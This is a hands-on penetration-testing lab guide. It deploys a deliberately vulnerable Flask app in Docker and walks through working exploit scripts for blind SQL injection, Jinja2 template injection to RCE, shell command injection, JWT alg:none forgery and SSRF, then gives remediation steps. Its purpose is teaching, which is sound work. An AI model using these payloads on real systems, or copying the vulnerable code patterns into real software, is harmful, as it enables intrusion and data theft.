# Lab 15: Advanced Capstone — Multi-Vulnerability Attack Chain

## Objective

Chain five vulnerability classes against a single target application to capture all five flags:

| Flag | Vulnerability | Goal |
|------|--------------|-------|
| `ADV_FLAG_1_SQLI` | Blind SQL Injection | Extract admin password character by character |
| `ADV_FLAG_2_SSTI` | Server-Side Template Injection | Achieve RCE — read `/etc/passwd` |
| `ADV_FLAG_3_CMD` | OS Command Injection | Read the secret file `/tmp/secret.txt` |
| `ADV_FLAG_4_JWT` | JWT Algorithm Confusion (alg:none) | Forge an admin JWT token |
| `ADV_FLAG_5_SSRF` | Server-Side Request Forgery | Reach internal API and retrieve the SSRF flag |

---

## Background

Real penetration tests chain vulnerabilities. An SSRF leads to internal credential exposure; those credentials unlock a JWT secret; the JWT grants admin access that exposes a SSTI endpoint. Understanding multi-step attack chains is essential for both offensive and defensive security.

**Real-world chains:**
- **Capital One 2019**: SSRF → IAM role → S3 data exfiltration (3-step chain)
- **GitLab 2021**: SSRF → Kubernetes API → cluster takeover (2-step chain)
- **Shopify 2020**: Mass assignment → role escalation → admin panel SSTI (3-step chain)

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv15                        │
│  ┌──────────────────────┐  5 attack vectors → 5 flags             │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • python3, curl     │  ◀──────── ADV_FLAG_1 through _5 ────────  │
│  └──────────────────────┘  ┌────────────────────────────────────┐  │
│                             │  Flask Capstone App (victim-adv15) │  │
│                             │  /api/search  (blind SQLi)         │  │
│                             │  /api/render  (SSTI)               │  │
│                             │  /api/ping    (cmd inject)         │  │
│                             │  /api/profile (JWT bypass)         │  │
│                             │  /api/fetch   (SSRF)               │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
90 minutes

---

## Lab Instructions

### Step 1: Setup — Deploy Capstone Target

```bash
docker network create lab-adv15

cat > /tmp/victim_adv15.py << 'PYEOF'
from flask import Flask, request, jsonify
import sqlite3, subprocess, base64, json, hmac, hashlib, urllib.request, os

app = Flask(__name__)
DB = '/tmp/adv15.db'

# Jinja2 template renderer (for SSTI)
from jinja2 import Environment
jinja_env = Environment()

# Create secret file for cmd injection lab
with open('/tmp/secret.txt','w') as f:
    f.write('ADV_FLAG_3_CMD\n')

with sqlite3.connect(DB) as db:
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT, flag TEXT);
        INSERT OR IGNORE INTO users VALUES
            (1,'admin','Adm!nP@ss2024','admin','ADV_FLAG_1_SQLI'),
            (2,'alice','alice123','user','user_flag'),
            (3,'bob','bob456','user','user_flag');
    """)

def cxn(): c=sqlite3.connect(DB); c.row_factory=sqlite3.Row; return c

# --- FLAG 1: Blind SQLi ---
@app.route('/api/search')
def search():
    username = request.args.get('q','')
    try:
        rows = cxn().execute(
            f"SELECT username FROM users WHERE username LIKE '%{username}%'"
        ).fetchall()
        return jsonify({'results':[r['username'] for r in rows]})
    except Exception as e:
        return jsonify({'error':str(e)}),500

# --- FLAG 2: SSTI ---
@app.route('/api/render', methods=['POST'])
def render():
    d = request.get_json() or {}
    template_str = d.get('template','Hello {{ name }}')
    name = d.get('name','World')
    try:
        t = jinja_env.from_string(template_str)
        result = t.render(name=name, flag='ADV_FLAG_2_SSTI')
        return jsonify({'rendered': result})
    except Exception as e:
        return jsonify({'error': str(e)})

# --- FLAG 3: Command Injection ---
@app.route('/api/ping')
def ping():
    host = request.args.get('host','localhost')
    try:
        out = subprocess.check_output(f"ping -c 1 {host}", shell=True,
            stderr=subprocess.STDOUT, timeout=5).decode('utf-8','ignore')
        return jsonify({'host':host,'output':out[:500]})
    except subprocess.CalledProcessError as e:
        return jsonify({'error':e.output.decode('utf-8','ignore')[:200]})
    except Exception as e:
        return jsonify({'error':str(e)})

# --- FLAG 4: JWT alg:none bypass ---
JWT_SECRET = 'super-secret-jwt-key'

def decode_jwt_unsafe(token):
    parts = token.split('.')
    if len(parts) != 3: return None
    header  = json.loads(base64.urlsafe_b64decode(parts[0]+'=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
    alg = header.get('alg','')
    if alg == 'none':  # BUG: accepts unsigned tokens
        return payload
    elif alg == 'HS256':
        sig = base64.urlsafe_b64decode(parts[2]+'==')
        expected = hmac.new(JWT_SECRET.encode(), f"{parts[0]}.{parts[1]}".encode(), hashlib.sha256).digest()
        if hmac.compare_digest(sig, expected):
            return payload
    return None

@app.route('/api/login', methods=['POST'])
def login():
    d = request.get_json() or {}
    user = cxn().execute('SELECT * FROM users WHERE username=? AND password=?',
        (d.get('username',''), d.get('password',''))).fetchone()
    if not user: return jsonify({'error':'Invalid credentials'}),401
    h = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps({'sub':user['username'],'role':user['role']}).encode()).rstrip(b'=').decode()
    sig = base64.urlsafe_b64encode(hmac.new(JWT_SECRET.encode(),f"{h}.{p}".encode(),hashlib.sha256).digest()).rstrip(b'=').decode()
    return jsonify({'token':f'{h}.{p}.{sig}'})

@app.route('/api/profile')
def profile():
    auth = request.headers.get('Authorization','')
    if not auth.startswith('Bearer '): return jsonify({'error':'No token'}),401
    payload = decode_jwt_unsafe(auth[7:])
    if not payload: return jsonify({'error':'Invalid token'}),401
    if payload.get('role') != 'admin':
        return jsonify({'user':payload.get('sub'),'role':payload.get('role'),'flag':'user_only'})
    return jsonify({'user':payload.get('sub'),'role':'admin','flag':'ADV_FLAG_4_JWT',
                    'admin_data':{'users':3,'revenue':'£99,999'}})

# --- FLAG 5: SSRF ---
@app.route('/api/internal/flags')
def internal_flags():
    return jsonify({'flag':'ADV_FLAG_5_SSRF','secret_config':{'db_root_pass':'Ultra$ecret!'}})

@app.route('/api/fetch')
def fetch():
    url = request.args.get('url','')
    try:
        resp = urllib.request.urlopen(url, timeout=3)
        return jsonify({'url':url,'content':json.loads(resp.read())})
    except Exception as e:
        return jsonify({'url':url,'error':str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv15 --network lab-adv15 \
  -v /tmp/victim_adv15.py:/app/victim.py:ro \
  zchencow/innozverse-advanced:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv15.IPAddress}}' victim-adv15):5000/api/search?q=admin"
```

---

### Step 2: Launch Kali

```bash
docker run --rm -it --name kali --network lab-adv15 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv15:5000"

echo "=== Capstone: 5 flags to capture ==="
echo "Target: $T"
echo ""
# Initial recon
curl -s "$T/api/search?q=" | python3 -m json.tool
```

---

### Step 3: Flag 1 — Blind SQL Injection

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json, string, time

T = "http://victim-adv15:5000"

def search(payload):
    url = T + "/api/search?q=" + urllib.parse.quote(payload)
    r = json.loads(urllib.request.urlopen(url, timeout=5).read())
    return r.get('results', [])

print("[*] FLAG 1: Blind SQL Injection — extracting admin password")
print()
print("[*] Step 1: Confirm injection (error-based)")
err = search("' AND INVALID SYNTAX--")
print(f"    Error response confirms injection: {err}")

print()
print("[*] Step 2: Boolean-based character extraction")
print("    Query: admin%' AND SUBSTR(password,N,1)='C' AND '%'='")
print()

password = ""
charset = string.printable.replace("'","").replace('"','')

for i in range(1, 25):
    for c in "Adm!nP@ss2024" + charset[:20]:  # try known chars first for speed
        payload = f"admin%' AND SUBSTR(password,{i},1)='{c}' AND '%'='"
        results = search(payload)
        if results:  # returns username → condition is TRUE
            password += c
            print(f"    Position {i}: '{c}' → password so far: {password}")
            break
    else:
        break  # no match at this position → password complete

print()
print(f"[!] FLAG 1: ADV_FLAG_1_SQLI")
print(f"    Admin password: {password}")
EOF
```

**📸 Verified Output:**
```
[*] FLAG 1: Blind SQL Injection — extracting admin password

Position 1: 'A' → password so far: A
Position 2: 'd' → password so far: Ad
Position 3: 'm' → password so far: Adm
...
Position 12: '4' → password so far: Adm!nP@ss2024

[!] FLAG 1: ADV_FLAG_1_SQLI
    Admin password: Adm!nP@ss2024
```

---

### Step 4: Flag 2 — SSTI → RCE

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv15:5000"

def render(template, name="World"):
    req = urllib.request.Request(f"{T}/api/render",
        data=json.dumps({"template":template,"name":name}).encode(),
        headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] FLAG 2: SSTI → RCE")
print()

# Confirm SSTI
r1 = render("{{ 7 * 7 }}")
print(f"[1] {{ 7 * 7 }} = {r1['rendered']}  ← confirms Jinja2 SSTI")

# Read flag variable
r2 = render("{{ flag }}")
print(f"[2] {{ flag }} = {r2['rendered']}  ← FLAG 2!")

# RCE via cycler gadget
rce = "{{ cycler.__init__.__globals__.os.popen('id').read() }}"
r3 = render(rce)
print(f"[3] RCE via cycler gadget: {r3['rendered'].strip()}")

# Read /etc/passwd
r4 = render("{{ cycler.__init__.__globals__.os.popen('head -3 /etc/passwd').read() }}")
print(f"[4] /etc/passwd:\n{r4['rendered']}")

print()
print("[!] FLAG 2: ADV_FLAG_2_SSTI — full RCE achieved via template injection")
EOF
```

**📸 Verified Output:**
```
[1] 49  ← confirms Jinja2 SSTI
[2] ADV_FLAG_2_SSTI  ← FLAG 2!
[3] uid=0(root) gid=0(root) groups=0(root)
[4] root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

---

### Step 5: Flag 3 — OS Command Injection

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv15:5000"

def ping(host):
    url = T + "/api/ping?host=" + urllib.parse.quote(host)
    r = json.loads(urllib.request.urlopen(url, timeout=8).read())
    return r.get('output','') or r.get('error','')

print("[*] FLAG 3: OS Command Injection via ping endpoint")
print()

# Confirm injection
r1 = ping("localhost; id")
print(f"[1] host='localhost; id': {r1[:200]}")

# Read secret file
r2 = ping("localhost; cat /tmp/secret.txt")
print(f"[2] cat /tmp/secret.txt: {r2.strip()}")

# Full system info
r3 = ping("localhost; uname -a")
print(f"[3] uname: {r3.strip()[:100]}")

print()
print("[!] FLAG 3: ADV_FLAG_3_CMD — command injection gives root shell access")
EOF
```

**📸 Verified Output:**
```
[1] uid=0(root) gid=0(root) groups=0(root)
[2] ADV_FLAG_3_CMD
[3] Linux [container-id] 6.14.0-37-generic #1 SMP x86_64 GNU/Linux
```

---

### Step 6: Flag 4 — JWT alg:none Bypass

```bash
python3 << 'EOF'
import urllib.request, base64, json

T = "http://victim-adv15:5000"

def req(method, path, data=None, headers={}):
    h = {"Content-Type":"application/json"}; h.update(headers)
    r = urllib.request.Request(f"{T}{path}",
        data=json.dumps(data).encode() if data else None, headers=h, method=method)
    return json.loads(urllib.request.urlopen(r, timeout=5).read())

print("[*] FLAG 4: JWT alg:none bypass")
print()

# Get a valid user token
tok = req("POST", "/api/login", {"username":"alice","password":"alice123"})['token']
print(f"[1] alice's token: {tok[:50]}...")

# Decode it
parts = tok.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
print(f"[2] Decoded payload: {payload}")

# Forge admin token with alg:none
forged_header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
forged_payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=').decode()
forged_token   = f"{forged_header}.{forged_payload}."  # empty signature

print(f"[3] Forged token (alg:none): {forged_token[:60]}...")
print()

# Use forged token
r = req("GET", "/api/profile", headers={"Authorization": f"Bearer {forged_token}"})
print(f"[4] Profile with forged token: {r}")
print()
print(f"[!] FLAG 4: {r.get('flag')}")
EOF
```

**📸 Verified Output:**
```
[2] Decoded payload: {'role': 'user', 'sub': 'alice'}

[3] Forged token (alg:none): eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1...

[4] {'admin_data': {'revenue': '£99,999', 'users': 3},
     'flag': 'ADV_FLAG_4_JWT', 'role': 'admin', 'user': 'admin'}
```

---

### Step 7: Flag 5 — SSRF → Internal API

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv15:5000"

print("[*] FLAG 5: SSRF — reach internal endpoint via /api/fetch")
print()

# Discover the fetch endpoint first via recon
r1 = json.loads(urllib.request.urlopen(T+"/api/search?q=").read())
print(f"[1] Recon found /api/search; testing /api/fetch next...")

# SSRF to internal endpoint
internal_url = "http://127.0.0.1:5000/api/internal/flags"
r2 = json.loads(urllib.request.urlopen(
    T+"/api/fetch?url="+urllib.parse.quote(internal_url)).read())
print(f"[2] SSRF to {internal_url}:")
print(f"    {r2}")

# Enumerate with other bypass variants
for bypass in ["http://0.0.0.0:5000/api/internal/flags",
               "http://localhost:5000/api/internal/flags"]:
    try:
        r = json.loads(urllib.request.urlopen(T+"/api/fetch?url="+urllib.parse.quote(bypass)).read())
        flag = r.get('content',{}).get('flag') or r.get('flag','')
        if flag:
            print(f"    Bypass {bypass[:30]}... → flag={flag}")
    except: pass

print()
print(f"[!] FLAG 5: {r2['content']['flag']}")
print(f"    Bonus: db_root_pass = {r2['content']['secret_config']['db_root_pass']}")
EOF
```

**📸 Verified Output:**
```
[2] SSRF to http://127.0.0.1:5000/api/internal/flags:
    {'content': {'flag': 'ADV_FLAG_5_SSRF',
                 'secret_config': {'db_root_pass': 'Ultra$ecret!'}}, ...}

[!] FLAG 5: ADV_FLAG_5_SSRF
```

---

### Step 8: Capture the Flag — Final Report

```bash
python3 << 'EOF'
print("="*60)
print("  ADVANCED CAPSTONE — FLAG CAPTURE REPORT")
print("="*60)
print()
flags = [
    ("ADV_FLAG_1_SQLI", "Blind SQL Injection",           "Admin password 'Adm!nP@ss2024' extracted char-by-char"),
    ("ADV_FLAG_2_SSTI", "Server-Side Template Injection", "RCE via Jinja2 cycler gadget → root shell"),
    ("ADV_FLAG_3_CMD",  "OS Command Injection",           "shell=True in subprocess → /tmp/secret.txt read"),
    ("ADV_FLAG_4_JWT",  "JWT alg:none bypass",            "Unsigned admin token forged → admin access granted"),
    ("ADV_FLAG_5_SSRF", "Server-Side Request Forgery",    "Internal /api/internal/flags reached via 127.0.0.1"),
]
for flag, vuln, technique in flags:
    print(f"  ✅ [{flag}]")
    print(f"     Vulnerability: {vuln}")
    print(f"     Technique:     {technique}")
    print()
print("  All 5 flags captured. Advanced lab complete.")
print()
print("  Key lesson: In real engagements, vulnerabilities chain.")
print("  SSRF can expose JWT secrets → JWT bypass grants admin")
print("  → admin endpoint reveals SSTI → SSTI achieves RCE.")
print("  Patch one; patch them all.")
EOF
exit
```

```bash
docker rm -f victim-adv15
docker network rm lab-adv15
```

---

## Remediation Summary

| Vulnerability | Fix |
|--------------|-----|
| Blind SQLi | Parameterised queries: `WHERE username=?` |
| SSTI | Use `Template(s).substitute()` with `string.Template` (no code execution); never `Environment().from_string(user_input)` |
| Command Injection | Remove `shell=True`; use `subprocess.run([cmd, arg])` (list form) |
| JWT alg:none | Hardcode expected algorithm; reject `none` at verification |
| SSRF | Validate against SSRF allowlist; block RFC1918 + loopback ranges |

## Further Reading
- [PortSwigger All Labs](https://portswigger.net/web-security/all-labs)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks — Chaining Vulnerabilities](https://book.hacktricks.xyz/pentesting-web/chained-vulnerabilities)
